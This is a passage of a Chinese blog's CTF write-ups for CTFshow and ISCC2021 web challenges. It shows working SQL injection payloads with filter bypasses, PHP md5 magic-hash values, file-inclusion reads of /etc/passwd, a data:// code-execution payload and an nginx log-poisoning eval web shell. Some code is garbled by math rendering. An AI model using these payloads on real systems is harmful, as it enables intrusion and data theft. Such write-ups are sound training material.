class="hljs-number">-0</span>_GET[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        MATHJAX-SSR<span class="hljs-number">-1</span>_GET[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(MATHJAX-SSR<span class="hljs-number">-2</span>v2))&#123;<br>            <span class="hljs-keyword">if</span>(!ctype_alpha(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(md5(MATHJAX-SSR<span class="hljs-number">-3</span>v2))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(md5(MATHJAX-SSR<span class="hljs-number">-4</span>v2))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure>
<p>对代码进行解读，可以看到<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.29ex" height="3.343ex" style="vertical-align: -1.171ex;" viewBox="0 -934.9 6583.2 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v1为字符形式，</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-31" x="485" y="0"></use>
<g transform="translate(986,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">为</text>
</g>
<g transform="translate(1918,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">字</text>
</g>
<g transform="translate(2851,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">符</text>
</g>
<g transform="translate(3784,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">形</text>
</g>
<g transform="translate(4717,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">式</text>
</g>
<g transform="translate(5650,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">，</text>
</g>
</g>
</svg>v2为数字形式，并且二者的值必须相等<br>在这里涉及到了一个知识：==MD5 compare漏洞==看一下这是什么</p>
<ul>
<li>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</li>
</ul>
<p>参考常见的payload有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0x01</span> md5(str)<br>    QNKCDZO<br>    <span class="hljs-number">240610708</span><br>    s878926199a<br>    s155964671a<br>    s214587387a<br>    s214587387a<br>     sha1(str)<br>    sha1(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)  <br>    sha1(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)<br>    sha1(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)<br>    sha1(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)<br><br><span class="hljs-number">0x02</span> md5(md5(str).<span class="hljs-string">&quot;SALT&quot;</span>)<br>    <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p> 构造本题的payload: <code>?v1=QNKCDZO&amp;v2=240610708</code><br> <img  src="https://img-blog.csdnimg.cn/20210530200616904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>知识点参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/60968595">PHP 函数漏洞总结</a></p>
<h1 id="二、web06"><a href="#二、web06" class="headerlink" title="二、web06"></a>二、web06</h1><p><img  src="https://img-blog.csdnimg.cn/20210530201456544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>是不是很相似呢，是的!本题与第二关是相同的类型，考察的都是<strong>POST注入</strong> 只不过在本关存在过滤<img  src="https://img-blog.csdnimg.cn/20210530201725887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>经过测试发现该关是将空格符号过滤掉了🤬🤬在本关可以使用<code>/**/对空格进行代替</code></p>
<p>其他均与第二关相似<br>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1/**/union/**/select/**/1,2,3#</span><br><span class="hljs-string">2、1&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><span class="hljs-comment">#</span><br><span class="hljs-number">3</span>、<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1/**/union/**/select/**/1,table_name,3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;</span>web2<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">4、1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;flag&#x27;</span><span class="hljs-comment">#</span><br><span class="hljs-number">5</span>、<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1/**/union/**/select/**/1,flag,3/**/from/**/flag#</span><br></code></pre></td></tr></table></figure>
<p><strong>回显</strong><br><img  src="https://img-blog.csdnimg.cn/20210530202329645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>表名</strong><br><img  src="https://img-blog.csdnimg.cn/20210530202343902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>列名</strong><br><img  src="https://img-blog.csdnimg.cn/20210530202400365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>字段</strong><br><img  src="https://img-blog.csdnimg.cn/20210530202424774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>字段内容</strong><br><img  src="https://img-blog.csdnimg.cn/20210530202439662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/CTFshow(web2-4%EF%BC%89/">CTFshow(web2-4）</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.964Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        <p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h1><p><img  src="https://img-blog.csdnimg.cn/20210529112350544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p><img  src="https://img-blog.csdnimg.cn/20210529112403564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>进入可以看到表单,很明显这是POST注入，可以利用万能密码进行登录</p>
<p>测试：<br><img  src="https://img-blog.csdnimg.cn/20210529112603193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>登陆成功</p>
<p>回显查看<br><code>1&#39; or 1=1 union select 1,2,3#</code><br><img  src="https://img-blog.csdnimg.cn/20210529112757746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>进行数据库的查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1 union select 1,database(),3#</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210529112920428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>查询表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;</span>web2<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210529113138730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>查询字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210529113331574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>查询字段内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,flag,3 from flag#</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/2021052911343287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="web03"><a href="#web03" class="headerlink" title="web03"></a>web03</h1><p><img  src="https://img-blog.csdnimg.cn/2021052911423421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>根据提示，这是存在文件包含漏洞，提示<code>url</code> 进行测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210529114421346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可见存在文件包含漏洞<br>本题可以是使用PHP伪协议+文件包含，实现任意命令执行<br><strong>方法一</strong>：<br>php伪协议中的data通过通配符查找目录下的所有文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?url<span class="hljs-operator">=</span>data:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>text<span class="hljs-operator">/</span>plain,<span class="hljs-operator">&lt;</span>?php print_r(glob(&quot;*&quot;)); ?<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210529114914757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到ctf_go_go_go的文件进行访问<img  src="https://img-blog.csdnimg.cn/20210529115004829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/2021052912011174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>发现一个常见的php伪协议及用法表，贴出来<img  src="https://img-blog.csdnimg.cn/20210529120428427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="web04-日志注入"><a href="#web04-日志注入" class="headerlink" title="web04(日志注入)"></a>web04(日志注入)</h1><p><img  src="https://img-blog.csdnimg.cn/20210530192254801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以见到本题与上一题相似，虽然过滤了php，但可能存在文件包含漏洞，进行测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210530192501916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>查看日志信息，发现服务器是nginx；<img  src="https://img-blog.csdnimg.cn/20210530192800148.png"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210530192829313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>在日志包含中，找到nginx的log有两种：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>log<span class="hljs-operator">/</span>nginx<span class="hljs-operator">/</span>access.log<br><span class="hljs-number">2</span>、?url<span class="hljs-operator">=</span><span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>log<span class="hljs-operator">/</span>nginx<span class="hljs-operator">/</span>error.log<br></code></pre></td></tr></table></figure>
<p>这里：?url=/var/log/nginx/access.log可以打开<br><img  src="https://img-blog.csdnimg.cn/20210530193101859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210530193133477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>进行日志注入</strong><br>为了防止url编码，需要在burp中修改<code>User-Agent</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>?php <span class="hljs-variable">@eval</span>($_POST[<span class="hljs-string">&#x27;2&#x27;</span>]);?<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210530193704899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>使用蚁剑进行连接</p>
<p><img  src="https://img-blog.csdnimg.cn/20210530193932469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>连接成功后打开目录<br><img  src="https://img-blog.csdnimg.cn/20210530194007998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到flag<br><img  src="https://img-blog.csdnimg.cn/20210530194039228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/ISCC2021-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%86%8D%E7%8E%B0/">ISCC2021-部分题目再现</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.962Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        </font>

<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>很明显，本题需要进行sql注入但是并不知道注入点<br>经过测试，判断注入点为：<code>’</code> 闭合符号用%23代替<img  src="https://img-blog.csdnimg.cn/20210524193940823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>在后面测试发现空格被过滤了，我们可以使用<code>%0d</code>进行绕过<br>尝试使用联合查询发现<code>union,select</code>,尝试使用双写进行绕过<br>payload<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,2,3%23</code><img  src="https://img-blog.csdnimg.cn/20210524194243748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到显示位<br>根据一贯风格，爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,database(),3%23</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210524194530324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>然后是爆表名，经过测试发现<code>from、information_schema</code>同样也被过滤了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、<span class="hljs-keyword">from</span> 则可以尝试进行双写或者大写转换等进行绕过<br><span class="hljs-number">2</span>、information_schema的话则可以尝试同类型进行转换，查看版本，<span class="hljs-number">5.7</span><span class="hljs-number">.33</span>，存在sys数据库，所以可以利用sys数据库查出表名<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210524195109868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>构造payload<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFROM%0dsys.schema_table_statistics_with_buffer),3%0d%23</code><br><img  src="https://img-blog.csdnimg.cn/20210524200012321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到表名<br>判断列数<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFROM%0dsys.schema_auto_increment_columns),3%0d%23</code><img  src="https://img-blog.csdnimg.cn/20210524200440224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>表名都是iscc_flag<br>盲猜列名是：flag<br>构造payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dflag%0dfrom%0discc_flag),3%0d%23</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210524200822427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>进入该页面得到源码进行分析</p>
<p>`&lt;?php</p>
<p>if(isset($_GET[‘c’])){<br>  <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.46ex" height="1.676ex" style="vertical-align: -0.338ex;" viewBox="0 -576.1 1489.8 721.6" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">c=</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="711" y="0"></use>
